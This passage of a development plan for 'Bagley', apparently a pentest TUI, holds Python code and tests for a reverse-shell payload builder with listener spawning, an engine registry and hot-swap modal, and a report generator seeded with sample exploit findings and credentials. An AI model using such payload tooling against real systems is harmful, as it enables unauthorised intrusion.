    def _on_any_change(self, _event) -> None:
        self._refresh_preview()

    def _build_config(self) -> PayloadConfig | None:
        try:
            lhost = self.query_one("#lhost-input", Input).value.strip()
            lport_str = self.query_one("#lport-input", Input).value.strip()
            lport = int(lport_str) if lport_str.isdigit() else 0
            ptype = self.query_one("#type-select", Select).value
            encoding = self.query_one("#encoding-select", Select).value
            return PayloadConfig(
                type=ptype or PayloadType.BASH,
                lhost=lhost or "127.0.0.1",
                lport=lport or 4444,
                encoding=encoding or Encoding.NONE,
            )
        except Exception:
            return None

    def _refresh_preview(self) -> None:
        cfg = self._build_config()
        preview = self.query_one("#payload-preview", Static)
        if cfg is None:
            preview.update("[dim]<invalid config>[/dim]")
            return
        try:
            text = generate(cfg)
            preview.update(text)
        except ValueError as exc:
            preview.update(f"[red]{exc}[/red]")

    def _current_payload(self) -> str:
        cfg = self._build_config()
        if cfg is None:
            return ""
        try:
            return generate(cfg)
        except ValueError:
            return ""

    # ------------------------------------------------------------------
    # Actions
    # ------------------------------------------------------------------

    def action_copy_payload(self) -> None:
        payload = self._current_payload()
        if payload:
            pyperclip.copy(payload)
            self.notify("Payload copied to clipboard", severity="information")

    def action_inject_payload(self) -> None:
        payload = self._current_payload()
        if self._inject_callback is not None:
            self._inject_callback(payload)
        self.dismiss(payload)

    def action_spawn_listener(self) -> None:
        """Spawns a netcat listener in a new ShellPane.

        ShellPane integration is provided by Phase 5; here we post a message
        to the app for it to handle, and fall back gracefully if unavailable.
        """
        try:
            lport = int(self.query_one("#lport-input", Input).value.strip())
        except ValueError:
            lport = 4444
        self.app.post_message_no_wait(
            self.app.SpawnListener(lport=lport)
        ) if hasattr(self.app, "SpawnListener") else None
        self.dismiss(None)

    @on(Button.Pressed, "#btn-copy")
    def _on_copy_btn(self, _event) -> None:
        self.action_copy_payload()

    @on(Button.Pressed, "#btn-inject")
    def _on_inject_btn(self, _event) -> None:
        self.action_inject_payload()

    @on(Button.Pressed, "#btn-listener")
    def _on_listener_btn(self, _event) -> None:
        self.action_spawn_listener()
```

- [ ] **Step 5.4: Wire `Alt+Y` into `app.py`**

Add to `BINDINGS` in `app.py`:

```python
Binding("alt+y", "payload_builder", "Payload builder", show=False),
```

Add the action method:

```python
def action_payload_builder(self) -> None:
    from bagley.tui.widgets.payload_modal import PayloadModal

    def _inject(payload: str | None) -> None:
        if payload:
            try:
                chat = self.query_one("#chat-input")
                chat.value = (chat.value or "") + payload
            except Exception:
                pass

    self.push_screen(PayloadModal(inject_callback=_inject))
```

- [ ] **Step 5.5: Run — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_payload_modal.py -v
```

Expected: all 6 tests pass.

- [ ] **Step 5.6: Commit**

```bash
git add src/bagley/tui/widgets/payload_modal.py src/bagley/tui/app.py tests/tui/test_payload_modal.py
git commit -m "feat(tui/p6): PayloadModal Alt+Y — live preview, clipboard copy, chat inject"
```

---

## Task 6: Engine registry

**Files:**
- Create: `src/bagley/tui/services/engine_registry.py`
- Create: `tests/tui/test_engine_registry.py`

- [ ] **Step 6.1: Write the failing registry test**

Create `tests/tui/test_engine_registry.py`:

```python
"""Tests for engine_registry — local adapter discovery and Ollama enumeration.

Ollama HTTP calls are mocked with `responses` library (no real network).
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import responses as resp

from bagley.tui.services.engine_registry import (
    EngineEntry,
    EngineKind,
    list_engines,
)


# ---------------------------------------------------------------------------
# Local adapter discovery
# ---------------------------------------------------------------------------

def test_discovers_local_adapters(tmp_path: Path):
    # Simulate a runs/ directory with adapter dirs containing adapter_config.json
    for name in ("bagley-v9", "bagley-v10-modal"):
        d = tmp_path / name
        d.mkdir()
        (d / "adapter_config.json").write_text("{}")

    engines = list_engines(runs_dir=tmp_path, ollama_host=None)
    local_labels = [e.label for e in engines if e.kind == EngineKind.LOCAL]
    assert "bagley-v9" in local_labels
    assert "bagley-v10-modal" in local_labels


def test_ignores_non_adapter_dirs(tmp_path: Path):
    (tmp_path / "eval-v9").mkdir()          # no adapter_config.json
    (tmp_path / "bagley-v9").mkdir()
    (tmp_path / "bagley-v9" / "adapter_config.json").write_text("{}")

    engines = list_engines(runs_dir=tmp_path, ollama_host=None)
    local_labels = [e.label for e in engines if e.kind == EngineKind.LOCAL]
    assert "eval-v9" not in local_labels
    assert "bagley-v9" in local_labels


def test_stub_engine_always_present(tmp_path: Path):
    engines = list_engines(runs_dir=tmp_path, ollama_host=None)
    stubs = [e for e in engines if e.kind == EngineKind.STUB]
    assert len(stubs) == 1
    assert stubs[0].label == "stub"


# ---------------------------------------------------------------------------
# Ollama discovery (mocked HTTP)
# ---------------------------------------------------------------------------

OLLAMA_TAGS_RESPONSE = {
    "models": [
        {"name": "bagley:latest", "size": 5000000000},
        {"name": "llama3.1:8b", "size": 4000000000},
    ]
}


@resp.activate
def test_discovers_ollama_models(tmp_path: Path):
    resp.add(
        resp.GET,
        "http://localhost:11434/api/tags",
        json=OLLAMA_TAGS_RESPONSE,
        status=200,
    )
    engines = list_engines(runs_dir=tmp_path, ollama_host="http://localhost:11434")
    ollama_labels = [e.label for e in engines if e.kind == EngineKind.OLLAMA]
    assert "bagley:latest" in ollama_labels
    assert "llama3.1:8b" in ollama_labels


@resp.activate
def test_ollama_unavailable_is_skipped(tmp_path: Path):
    resp.add(
        resp.GET,
        "http://localhost:11434/api/tags",
        body=ConnectionError("refused"),
    )
    # Should not raise — just return no Ollama entries.
    engines = list_engines(runs_dir=tmp_path, ollama_host="http://localhost:11434")
    ollama = [e for e in engines if e.kind == EngineKind.OLLAMA]
    assert ollama == []


@resp.activate
def test_ollama_bad_status_is_skipped(tmp_path: Path):
    resp.add(
        resp.GET,
        "http://localhost:11434/api/tags",
        status=500,
    )
    engines = list_engines(runs_dir=tmp_path, ollama_host="http://localhost:11434")
    ollama = [e for e in engines if e.kind == EngineKind.OLLAMA]
    assert ollama == []


# ---------------------------------------------------------------------------
# EngineEntry fields
# ---------------------------------------------------------------------------

def test_engine_entry_has_required_fields(tmp_path: Path):
    (tmp_path / "bagley-v9").mkdir()
    (tmp_path / "bagley-v9" / "adapter_config.json").write_text("{}")
    engines = list_engines(runs_dir=tmp_path, ollama_host=None)
    local = [e for e in engines if e.kind == EngineKind.LOCAL][0]
    assert hasattr(local, "label")
    assert hasattr(local, "kind")
    assert hasattr(local, "path")   # Path or None
```

- [ ] **Step 6.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_engine_registry.py -v
```

Expected: `ImportError`.

- [ ] **Step 6.3: Implement `engine_registry.py`**

Create `src/bagley/tui/services/engine_registry.py`:

```python
"""Enumerate available Bagley inference engines.

Sources:
  1. LOCAL — directories in `runs/` that contain `adapter_config.json`.
  2. OLLAMA — models returned by `GET http://localhost:11434/api/tags`.
  3. STUB  — always present as a safe fallback.

Usage:
    engines = list_engines(
        runs_dir=Path("./runs"),
        ollama_host="http://localhost:11434",
    )
"""

from __future__ import annotations

import enum
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import httpx


class EngineKind(str, enum.Enum):
    LOCAL = "local"
    OLLAMA = "ollama"
    STUB = "stub"


@dataclass
class EngineEntry:
    label: str
    kind: EngineKind
    path: Optional[Path] = None      # adapter dir for LOCAL; None otherwise
    ollama_name: Optional[str] = None  # "bagley:latest" etc. for OLLAMA


def _discover_local(runs_dir: Path) -> list[EngineEntry]:
    """Return adapter dirs that contain adapter_config.json."""
    entries: list[EngineEntry] = []
    if not runs_dir.is_dir():
        return entries
    for sub in sorted(runs_dir.iterdir()):
        if sub.is_dir() and (sub / "adapter_config.json").exists():
            entries.append(EngineEntry(label=sub.name, kind=EngineKind.LOCAL, path=sub))
    return entries


def _discover_ollama(host: str) -> list[EngineEntry]:
    """Query Ollama /api/tags. Returns [] on any failure."""
    try:
        with httpx.Client(timeout=3.0) as client:
            r = client.get(f"{host}/api/tags")
            if r.status_code != 200:
                return []
            data = r.json()
            return [
                EngineEntry(
                    label=m["name"],
                    kind=EngineKind.OLLAMA,
                    ollama_name=m["name"],
                )
                for m in data.get("models", [])
            ]
    except Exception:
        return []


def list_engines(
    runs_dir: Path | None = None,
    ollama_host: str | None = "http://localhost:11434",
) -> list[EngineEntry]:
    """Return all available engines.

    Order: LOCAL (sorted by name) → OLLAMA → STUB.
    """
    if runs_dir is None:
        runs_dir = Path("./runs")

    engines: list[EngineEntry] = []
    engines.extend(_discover_local(runs_dir))

    if ollama_host:
        engines.extend(_discover_ollama(ollama_host))

    engines.append(EngineEntry(label="stub", kind=EngineKind.STUB))
    return engines
```

- [ ] **Step 6.4: Run — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_engine_registry.py -v
```

Expected: all 8 tests pass.

- [ ] **Step 6.5: Commit**

```bash
git add src/bagley/tui/services/engine_registry.py tests/tui/test_engine_registry.py
git commit -m "feat(tui/p6): engine_registry — local adapter + Ollama /api/tags discovery"
```

---

## Task 7: Hot-swap engine modal (Ctrl+Shift+M)

**Files:**
- Create: `src/bagley/tui/widgets/engine_swap_modal.py`
- Create: `tests/tui/test_engine_swap.py`
- Modify: `src/bagley/tui/app.py`

- [ ] **Step 7.1: Write the failing engine-swap test**

Create `tests/tui/test_engine_swap.py`:

```python
"""Tests for the Ctrl+Shift+M hot-swap engine modal."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import pytest

from bagley.tui.app import BagleyApp


@pytest.mark.asyncio
async def test_ctrl_shift_m_opens_engine_modal():
    with patch("bagley.tui.services.engine_registry.list_engines") as mock_list:
        from bagley.tui.services.engine_registry import EngineEntry, EngineKind
        mock_list.return_value = [
            EngineEntry(label="bagley-v9", kind=EngineKind.LOCAL, path=Path("/runs/bagley-v9")),
            EngineEntry(label="stub", kind=EngineKind.STUB),
        ]
        app = BagleyApp(stub=True)
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("ctrl+shift+m")
            await pilot.pause()
            modal = app.query_one("#engine-swap-modal")
            assert modal is not None


@pytest.mark.asyncio
async def test_engine_modal_lists_engines():
    with patch("bagley.tui.services.engine_registry.list_engines") as mock_list:
        from bagley.tui.services.engine_registry import EngineEntry, EngineKind
        mock_list.return_value = [
            EngineEntry(label="bagley-v9", kind=EngineKind.LOCAL, path=Path("/runs/bagley-v9")),
            EngineEntry(label="stub", kind=EngineKind.STUB),
        ]
        app = BagleyApp(stub=True)
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("ctrl+shift+m")
            await pilot.pause()
            modal = app.query_one("#engine-swap-modal")
            rendered = str(modal.render())
            assert "bagley-v9" in rendered or len(modal.query("OptionList,ListView")) > 0


@pytest.mark.asyncio
async def test_selecting_engine_updates_state_label():
    """After selection, app.state.engine_label is updated."""
    with patch("bagley.tui.services.engine_registry.list_engines") as mock_list:
        from bagley.tui.services.engine_registry import EngineEntry, EngineKind
        mock_list.return_value = [
            EngineEntry(label="bagley-v10-modal", kind=EngineKind.LOCAL, path=Path("/runs/v10")),
            EngineEntry(label="stub", kind=EngineKind.STUB),
        ]
        app = BagleyApp(stub=True)
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("ctrl+shift+m")
            await pilot.pause()
            # Trigger selection of first item (Enter on focused list)
            await pilot.press("enter")
            await pilot.pause()
            assert app.state.engine_label == "bagley-v10-modal"


@pytest.mark.asyncio
async def test_chat_history_preserved_after_swap():
    """Chat history in active tab must survive an engine swap."""
    with patch("bagley.tui.services.engine_registry.list_engines") as mock_list:
        from bagley.tui.services.engine_registry import EngineEntry, EngineKind
        mock_list.return_value = [
            EngineEntry(label="bagley-v9", kind=EngineKind.LOCAL, path=Path("/runs/v9")),
            EngineEntry(label="stub", kind=EngineKind.STUB),
        ]
        app = BagleyApp(stub=True)
        # Pre-seed chat history in state
        app.state.tabs[0].chat = [{"role": "user", "content": "seed message"}]
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("ctrl+shift+m")
            await pilot.pause()
            await pilot.press("enter")
            await pilot.pause()
            # History must still be present
            assert app.state.tabs[0].chat[0]["content"] == "seed message"


@pytest.mark.asyncio
async def test_esc_closes_engine_modal():
    with patch("bagley.tui.services.engine_registry.list_engines") as mock_list:
        from bagley.tui.services.engine_registry import EngineEntry, EngineKind
        mock_list.return_value = [EngineEntry(label="stub", kind=EngineKind.STUB)]
        app = BagleyApp(stub=True)
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("ctrl+shift+m")
            await pilot.pause()
            await pilot.press("escape")
            await pilot.pause()
            assert len(app.query("#engine-swap-modal")) == 0
```

- [ ] **Step 7.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_engine_swap.py -v
```

Expected: binding missing or `ImportError`.

- [ ] **Step 7.3: Implement `engine_swap_modal.py`**

Create `src/bagley/tui/widgets/engine_swap_modal.py`:

```python
"""Ctrl+Shift+M Hot-Swap Engine Modal.

Lists available engines (local adapters, Ollama models, stub).
On selection, replaces the active engine in AppState; subsequent chat
turns are tagged [engine=<label>] automatically.
Chat history is intentionally preserved across the swap.
"""

from __future__ import annotations

from typing import Callable

from textual.app import ComposeResult
from textual.binding import Binding
from textual.screen import ModalScreen
from textual.widgets import Label, ListView, ListItem, Static

from bagley.tui.services.engine_registry import EngineEntry, EngineKind, list_engines


_KIND_ICONS = {
    EngineKind.LOCAL: "[green]⬡[/green]",
    EngineKind.OLLAMA: "[cyan]⬡[/cyan]",
    EngineKind.STUB: "[dim]⬡[/dim]",
}


class EngineSwapModal(ModalScreen):
    """Full-screen modal listing available inference engines."""

    DEFAULT_CSS = """
    EngineSwapModal { align: center middle; }
    EngineSwapModal > #engine-swap-modal {
        width: 60;
        height: 24;
        border: thick $accent;
        background: $surface;
        padding: 1 2;
    }
    #engine-list { height: 16; border: solid $panel; }
    """

    BINDINGS = [
        Binding("escape", "dismiss", "Close", show=True),
    ]

    def __init__(
        self,
        on_select: Callable[[EngineEntry], None] | None = None,
        **kwargs,
    ) -> None:
        super().__init__(**kwargs)
        self._on_select = on_select
        self._engines: list[EngineEntry] = []

    def compose(self) -> ComposeResult:
        with Static(id="engine-swap-modal"):
            yield Label("[b]Hot-Swap Engine[/b]  (Enter to select, Esc to cancel)")
            yield ListView(id="engine-list")

    def on_mount(self) -> None:
        self._engines = list_engines()
        lv = self.query_one("#engine-list", ListView)
        for entry in self._engines:
            icon = _KIND_ICONS.get(entry.kind, "")
            lv.append(ListItem(Label(f"{icon} {entry.label}  [{entry.kind.value}]")))

    def on_list_view_selected(self, event: ListView.Selected) -> None:
        idx = self.query_one("#engine-list", ListView).index
        if idx is not None and 0 <= idx < len(self._engines):
            chosen = self._engines[idx]
            if self._on_select:
                self._on_select(chosen)
            self.dismiss(chosen)
```

- [ ] **Step 7.4: Wire `Ctrl+Shift+M` into `app.py`**

Add to `BINDINGS`:

```python
Binding("ctrl+shift+m", "engine_swap", "Hot-swap engine", show=False),
```

Add the action method:

```python
def action_engine_swap(self) -> None:
    from bagley.tui.widgets.engine_swap_modal import EngineSwapModal

    def _on_engine_selected(entry) -> None:
        if entry is None:
            return
        self.state.engine_label = entry.label
        # Tag transition in active tab chat history.
        active = self.state.tabs[self.state.active_tab]
        active.chat.append({
            "role": "system",
            "content": f"[engine={entry.label}]",
        })
        # Notify footer/statusline to refresh.
        try:
            self.query_one("#statusline").refresh_content()
        except Exception:
            pass
        self.notify(f"Engine switched to {entry.label}", severity="information")

    self.push_screen(EngineSwapModal(on_select=_on_engine_selected))
```

- [ ] **Step 7.5: Run — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_engine_swap.py -v
```

Expected: all 5 tests pass.

- [ ] **Step 7.6: Commit**

```bash
git add src/bagley/tui/widgets/engine_swap_modal.py src/bagley/tui/app.py tests/tui/test_engine_swap.py
git commit -m "feat(tui/p6): EngineSwapModal Ctrl+Shift+M — hot-swap with history preserved"
```

---

## Task 8: Reporter service

**Files:**
- Create: `src/bagley/tui/services/reporter.py`
- Create: `tests/tui/test_reporter.py`

- [ ] **Step 8.1: Write the failing reporter test**

Create `tests/tui/test_reporter.py`:

```python
"""Tests for the REPORT mode markdown/PDF generator.

Uses a seeded temporary SQLite (same schema as memory/store.py) plus
in-memory notes to verify the markdown output.
"""

from __future__ import annotations

import sqlite3
from pathlib import Path

import pytest

from bagley.tui.services.reporter import Reporter, ReportConfig


# ---------------------------------------------------------------------------
# Fixtures: seed a minimal MemoryStore-compatible SQLite
# ---------------------------------------------------------------------------

def _seed_db(db_path: Path) -> None:
    conn = sqlite3.connect(db_path)
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS hosts (
            ip TEXT PRIMARY KEY, hostname TEXT, first_seen TEXT, notes_md TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS ports (
            host TEXT, port INTEGER, proto TEXT, service TEXT, version TEXT, detected_at TEXT,
            PRIMARY KEY (host, port, proto)
        );
        CREATE TABLE IF NOT EXISTS creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, service TEXT,
            username TEXT, credential TEXT, source TEXT, validated INTEGER DEFAULT 0, created_at TEXT
        );
        CREATE TABLE IF NOT EXISTS findings (
            id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, severity TEXT,
            category TEXT, summary TEXT, evidence_path TEXT, cve TEXT, created_at TEXT
        );
        CREATE TABLE IF NOT EXISTS attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, technique TEXT,
            tool TEXT, outcome TEXT, ts TEXT, details TEXT
        );
    """)
    conn.execute("INSERT INTO hosts VALUES ('10.10.14.5','target.thm','2026-04-27','test host')")
    conn.execute("INSERT INTO ports VALUES ('10.10.14.5',80,'tcp','http','Apache 2.4.49','2026-04-27')")
    conn.execute("INSERT INTO creds VALUES (NULL,'10.10.14.5','ssh','admin','password123','hydra',1,'2026-04-27')")
    conn.execute(
        "INSERT INTO findings VALUES "
        "(NULL,'10.10.14.5','critical','RCE','CVE-2021-41773 path traversal RCE',NULL,'CVE-2021-41773','2026-04-27')"
    )
    conn.execute(
        "INSERT INTO attempts VALUES "
        "(NULL,'10.10.14.5','path-traversal','curl','success','2026-04-27','poc worked')"
    )
    conn.commit()
    conn.close()


@pytest.fixture
def seeded_db(tmp_path: Path) -> Path:
    db = tmp_path / "memory.db"
    _seed_db(db)
    return db


@pytest.fixture
def report_dir(tmp_path: Path) -> Path:
    d = tmp_path / "reports"
    d.mkdir()
    return d


# ---------------------------------------------------------------------------
# Markdown compilation
# ---------------------------------------------------------------------------

def test_report_contains_executive_summary_section(seeded_db, report_dir):
    notes = {"recon": "Initial recon complete. Target is Apache 2.4.49."}
    cfg = ReportConfig(db_path=seeded_db, notes=notes, output_dir=report_dir,
                       engagement="test-engagement")
    r = Reporter(cfg)
    md = r.compile()
    assert "# " in md
    assert "Executive Summary" in md or "executive" in md.lower()


def test_report_contains_hosts_section(seeded_db, report_dir):
    cfg = ReportConfig(db_path=seeded_db, notes={}, output_dir=report_dir,
                       engagement="test-engagement")
    md = Reporter(cfg).compile()
    assert "10.10.14.5" in md
    assert "target.thm" in md


def test_report_contains_findings_section(seeded_db, report_dir):
    cfg = ReportConfig(db_path=seeded_db, notes={}, output_dir=report_dir,
                       engagement="test-engagement")
    md = Reporter(cfg).compile()
    assert "critical" in md.lower() or "CRITICAL" in md
    assert "CVE-2021-41773" in md


def test_report_contains_creds_section(seeded_db, report_dir):
    cfg = ReportConfig(db_path=seeded_db, notes={}, output_dir=report_dir,
                       engagement="test-engagement")
    md = Reporter(cfg).compile()
    assert "admin" in md
    assert "ssh" in md


def test_report_contains_timeline_section(seeded_db, report_dir):
    cfg = ReportConfig(db_path=seeded_db, notes={}, output_dir=report_dir,
                       engagement="test-engagement")
    md = Reporter(cfg).compile()
    # Timeline comes from attempts table
    assert "path-traversal" in md or "2026-04-27" in md


def test_report_saves_markdown_file(seeded_db, report_dir):
    cfg = ReportConfig(db_path=seeded_db, notes={}, output_dir=report_dir,
                       engagement="test-engagement")
    r = Reporter(cfg)
    r.compile()
    saved = r.save()
    assert saved.exists()
    assert saved.suffix == ".md"
    assert "test-engagement" in saved.name


def test_report_includes_notes_from_all_tabs(seeded_db, report_dir):
    notes = {
        "recon": "Scope is 10.10.14.0/24.",
        "10.10.14.5": "This host runs Apache 2.4.49 which is vuln to CVE-2021-41773.",
    }
    cfg = ReportConfig(db_path=seeded_db, notes=notes, output_dir=report_dir,
                       engagement="test-engagement")
    md = Reporter(cfg).compile()
    assert "Scope is 10.10.14.0/24" in md
    assert "CVE-2021-41773" in md


def test_pdf_skipped_gracefully_when_renderer_absent(seeded_db, report_dir, monkeypatch):
    """When neither weasyprint nor pandoc is available, save() returns .md only."""
    import shutil
    monkeypatch.setattr(shutil, "which", lambda _: None)   # pretend nothing is installed

    cfg = ReportConfig(db_path=seeded_db, notes={}, output_dir=report_dir,
                       engagement="test-engagement", generate_pdf=True)
    r = Reporter(cfg)
    r.compile()
    saved = r.save()
    assert saved.suffix == ".md"     # PDF skipped; md saved
```

- [ ] **Step 8.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_reporter.py -v
```

Expected: `ImportError`.

- [ ] **Step 8.3: Implement `reporter.py`**

Create `src/bagley/tui/services/reporter.py`:

```python
"""REPORT mode pipeline.

Compiles notes from TUI tabs + memory/store.py SQLite into a structured
markdown pentest report.  Optionally converts to PDF via weasyprint (if
installed) or pandoc (detected via shutil.which).  Falls back to .md if
neither is available.

Output file: <output_dir>/<YYYY-MM-DD>-<engagement>.md

Usage:
    cfg = ReportConfig(
        db_path=Path("memory/memory.db"),
        notes={"recon": "...", "10.10.14.5": "..."},
        output_dir=Path("reports/"),
        engagement="htb-legacy",
        generate_pdf=True,
    )
    reporter = Reporter(cfg)
    md = reporter.compile()   # returns raw markdown string
    path = reporter.save()    # writes file(s), returns Path to .md
"""

from __future__ import annotations

import datetime
import shutil
import sqlite3
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional


@dataclass
class ReportConfig:
    db_path: Path
    output_dir: Path
    engagement: str
    notes: dict[str, str] = field(default_factory=dict)   # tab_id → notes_md
    generate_pdf: bool = False
    date: str = field(default_factory=lambda: datetime.date.today().isoformat())


class Reporter:
    def __init__(self, cfg: ReportConfig) -> None:
        self.cfg = cfg
        self._md: str = ""

    # ------------------------------------------------------------------
    # Public
    # ------------------------------------------------------------------

    def compile(self) -> str:
        """Build the markdown report string from notes + SQLite."""
        sections: list[str] = []
        sections.append(self._section_header())
        sections.append(self._section_executive_summary())
        sections.append(self._section_hosts())
        sections.append(self._section_findings())
        sections.append(self._section_creds())
        sections.append(self._section_timeline())
        sections.append(self._section_notes())
        self._md = "\n\n".join(s for s in sections if s.strip())
        return self._md

    def save(self) -> Path:
        """Write .md (and optionally PDF) to output_dir. Returns .md path."""
        if not self._md:
            self.compile()
        self.cfg.output_dir.mkdir(parents=True, exist_ok=True)
        filename = f"{self.cfg.date}-{self.cfg.engagement}.md"
        md_path = self.cfg.output_dir / filename
        md_path.write_text(self._md, encoding="utf-8")

        if self.cfg.generate_pdf:
            self._maybe_export_pdf(md_path)

        return md_path

    # ------------------------------------------------------------------
    # PDF export (best-effort)
    # ------------------------------------------------------------------

    def _maybe_export_pdf(self, md_path: Path) -> None:
        """Try weasyprint then pandoc; silently skip if neither is available."""
        pdf_path = md_path.with_suffix(".pdf")

        if shutil.which("weasyprint"):
            # weasyprint reads HTML; convert md → html first via stdlib
            try:
                import html
                html_content = "<html><body><pre>" + html.escape(self._md) + "</pre></body></html>"
                with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w") as f:
                    f.write(html_content)
                    html_path = f.name
                subprocess.run(
                    ["weasyprint", html_path, str(pdf_path)],
                    check=True, capture_output=True,
                )
            except Exception:
                pass
            return

        if shutil.which("pandoc"):
            try:
                subprocess.run(
                    ["pandoc", str(md_path), "-o", str(pdf_path), "--pdf-engine=xelatex"],
                    check=True, capture_output=True,
                )
            except Exception:
                pass
            return

        # Neither available — skip silently (md is still written).

    # ------------------------------------------------------------------
    # Section builders
    # ------------------------------------------------------------------

    def _section_header(self) -> str:
        return (
            f"# Pentest Report — {self.cfg.engagement}\n"
            f"**Date:** {self.cfg.date}  \n"
            f"**Generated by:** Bagley TUI REPORT mode\n"
        )

    def _section_executive_summary(self) -> str:
        lines = ["## Executive Summary", ""]
        counts = self._finding_counts()
        total = sum(counts.values())
        lines.append(
            f"Engagement **{self.cfg.engagement}** yielded **{total}** findings: "
            + ", ".join(f"{v} {k.upper()}" for k, v in counts.items() if v)
            + "."
        )
        lines.append("")
        return "\n".join(lines)

    def _section_hosts(self) -> str:
        rows = self._query(
            "SELECT ip, hostname, first_seen, notes_md FROM hosts ORDER BY ip"
        )
        if not rows:
            return ""
        lines = ["## Hosts", "", "| IP | Hostname | First Seen | Notes |",
                 "|---|---|---|---|"]
        for ip, hostname, first_seen, notes_md in rows:
            lines.append(f"| {ip} | {hostname or ''} | {first_seen or ''} | {_trunc(notes_md)} |")
        return "\n".join(lines)

    def _section_findings(self) -> str:
        rows = self._query(
            "SELECT severity, category, summary, cve, host FROM findings "
            "ORDER BY CASE severity "
            "WHEN 'critical' THEN 1 WHEN 'high' THEN 2 WHEN 'medium' THEN 3 ELSE 4 END"
        )
        if not rows:
            return ""
        lines = ["## Findings", "",
                 "| Severity | Category | Summary | CVE | Host |",
                 "|---|---|---|---|---|"]
        for severity, category, summary, cve, host in rows:
            lines.append(
                f"| {severity.upper()} | {category} | {summary} | {cve or '-'} | {host} |"
            )
        return "\n".join(lines)

    def _section_creds(self) -> str:
        rows = self._query(
            "SELECT host, service, username, credential, source, validated FROM creds ORDER BY host"
        )
        if not rows:
            return ""
        lines = ["## Credentials", "",
                 "| Host | Service | Username | Credential | Source | Validated |",
                 "|---|---|---|---|---|---|"]
        for host, service, username, credential, source, validated in rows:
            v = "yes" if validated else "no"
            lines.append(f"| {host} | {service} | {username} | {credential} | {source} | {v} |")
        return "\n".join(lines)

    def _section_timeline(self) -> str:
        rows = self._query(
            "SELECT ts, host, technique, tool, outcome, details FROM attempts ORDER BY ts"
        )
        if not rows:
            return ""
        lines = ["## Attack Timeline", "", "| Time | Host | Technique | Tool | Outcome |",
                 "|---|---|---|---|---|"]
        for ts, host, technique, tool, outcome, details in rows:
            lines.append(f"| {ts} | {host} | {technique} | {tool} | {outcome} |")
        return "\n".join(lines)

    def _section_notes(self) -> str:
        if not self.cfg.notes:
            return ""
        parts = ["## Operator Notes", ""]
        for tab_id, notes_md in self.cfg.notes.items():
            if notes_md and notes_md.strip():
                parts.append(f"### {tab_id}")
                parts.append(notes_md.strip())
                parts.append("")
        return "\n".join(parts)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _query(self, sql: str) -> list[tuple]:
        try:
            conn = sqlite3.connect(self.cfg.db_path)
            try:
                return conn.execute(sql).fetchall()
            finally:
                conn.close()
        except Exception:
            return []

    def _finding_counts(self) -> dict[str, int]:
        rows = self._query(
            "SELECT severity, COUNT(*) FROM findings GROUP BY severity"
        )
        counts: dict[str, int] = {}
        for severity, count in rows:
            counts[severity.lower()] = count
        return counts


def _trunc(text: str, limit: int = 60) -> str:
    if not text:
        return ""
    text = text.replace("\n", " ").strip()
    return text[:limit] + "…" if len(text) > limit else text
```

- [ ] **Step 8.4: Run — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_reporter.py -v
```

Expected: all 8 tests pass.

- [ ] **Step 8.5: Commit**

```bash
git add src/bagley/tui/services/reporter.py tests/tui/test_reporter.py
git commit -m "feat(tui/p6): Reporter — notes + SQLite → markdown pentest report with optional PDF"
```

---

## Task 9: REPORT mode intercept in ChatPanel + TTS hook

**Files:**
- Modify: `src/bagley/tui/panels/chat.py`

- [ ] **Step 9.1: Write the failing chat-panel REPORT mode test**

Add to `tests/tui/test_chat_panel.py` (append, do not overwrite existing tests):

```python
# ---- Phase 6 additions ----

@pytest.mark.asyncio
async def test_report_mode_submit_delegates_to_reporter(tmp_path):
    """In REPORT mode, submitting a message must NOT execute shell tools;
    instead it triggers the reporter to compile a report."""
    from unittest.mock import patch, MagicMock
    from bagley.tui.app import BagleyApp

    app = BagleyApp(stub=True)
    app.state.mode = "REPORT"
    with patch("bagley.tui.panels.chat.Reporter") as mock_reporter_cls:
        mock_reporter = MagicMock()
        mock_reporter.compile.return_value = "# Report\n\ntest content"
        mock_reporter.save.return_value = tmp_path / "report.md"
        mock_reporter_cls.return_value = mock_reporter
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("f3")          # focus chat
            await pilot.type("generate report")
            await pilot.press("enter")
            await pilot.pause()
            # Reporter should have been instantiated and compile() called
            assert mock_reporter_cls.called or mock_reporter.compile.called


@pytest.mark.asyncio
async def test_tts_hook_fires_on_assistant_message():
    """An assistant message posted to chat must call voice.speak() when ACTIVE."""
    from unittest.mock import MagicMock, patch
    from bagley.tui.app import BagleyApp
    from bagley.tui.services.voice import VoiceState

    app = BagleyApp(stub=True)
    mock_tts = MagicMock()
    app.voice._tts = mock_tts
    app.voice.state = VoiceState.ACTIVE

    async with app.run_test(size=(160, 40)) as pilot:
        # Simulate posting an assistant message to the chat panel
        chat = app.query_one("ChatPanel")
        chat.post_assistant_message("I found an open port.")
        await pilot.pause()
        mock_tts.speak.assert_called_once_with("I found an open port.")
```

- [ ] **Step 9.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_chat_panel.py -v -k "report_mode or tts_hook"
```

Expected: `AttributeError` or test not found.

- [ ] **Step 9.3: Modify `panels/chat.py`**

Open `src/bagley/tui/panels/chat.py`. Make the following additions — do not break existing Phase 1-5 behaviour:
